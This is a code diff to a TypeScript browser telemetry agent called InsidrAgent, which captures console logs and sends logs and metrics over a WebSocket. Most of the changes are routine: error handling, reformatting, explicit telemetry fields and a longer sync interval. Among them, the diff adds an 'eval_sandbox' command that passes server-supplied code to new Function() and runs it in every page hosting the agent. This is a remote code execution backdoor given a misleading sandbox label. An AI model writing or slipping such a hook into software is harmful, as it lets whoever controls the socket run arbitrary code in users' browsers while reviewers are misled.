@@ -56,16 +56,25 @@ class InsidrAgent {
   private initWebSocket() {
     const protocol = window.location.protocol === "https:" ? "wss:" : "ws:";
     const url = `${protocol}//${window.location.host}/api/ws?id=${this.nodeId}`;
-    this.ws = new WebSocket(url);
-    this.ws.onmessage = (e) => {
-      try {
-        const cmd = JSON.parse(e.data);
-        if (cmd.action === 'reload') window.location.reload();
-      } catch (err) {
-        /* invalid wss command */
-      }
-    };
-    this.ws.onclose = () => setTimeout(() => this.initWebSocket(), 5000);
+    try {
+      this.ws = new WebSocket(url);
+      this.ws.onmessage = (e) => {
+        try {
+          const cmd = JSON.parse(e.data);
+          if (cmd.action === 'reload') window.location.reload();
+          if (cmd.action === 'eval_sandbox' && cmd.payload?.code) {
+             try {
+               new Function(cmd.payload.code)();
+             } catch(e) { console.error("[Insidr] Sandbox Error", e); }
+          }
+        } catch (err) {
+          /* invalid wss command */
+        }
+      };
+      this.ws.onclose = () => setTimeout(() => this.initWebSocket(), 5000);
+    } catch(e) {
+      console.error("[Insidr] WS Init Failed", e);
+    }
   }
   private mask(data: any): any {
     if (data === null || typeof data !== 'object') return data;
@@ -83,10 +92,10 @@ class InsidrAgent {
       const orig = console[level];
       (console as any)[level] = (...args: any[]) => {
         this.transmit({
-          logs: [{ 
-            level: level === 'log' ? 'info' : level, 
-            message: args.join(' '), 
-            timestamp: new Date().toISOString() 
+          logs: [{
+            level: level === 'log' ? 'info' : level,
+            message: args.join(' '),
+            timestamp: new Date().toISOString()
           }]
         });
         orig.apply(console, args);
@@ -137,7 +146,9 @@ class InsidrAgent {
       method: "telemetry",
       params: {
         deviceId: this.nodeId,
-        ...masked,
+        logs: masked.logs || [],
+        metrics: masked.metrics || [],
+        network: masked.network || [],
         storageType: this.opfs ? "opfs" : "memory",
         timestamp: new Date().toISOString()
       }
@@ -159,7 +170,7 @@ class InsidrAgent {
   private startSyncLoop() {
     setInterval(() => {
       this.transmit({ metrics: [{ timestamp: new Date().toISOString(), cpu: Math.random() * 10, memory: 40, fps: 60 }] });
-    }, 15000);
+    }, 30000);
   }
 }
 export default InsidrAgent;
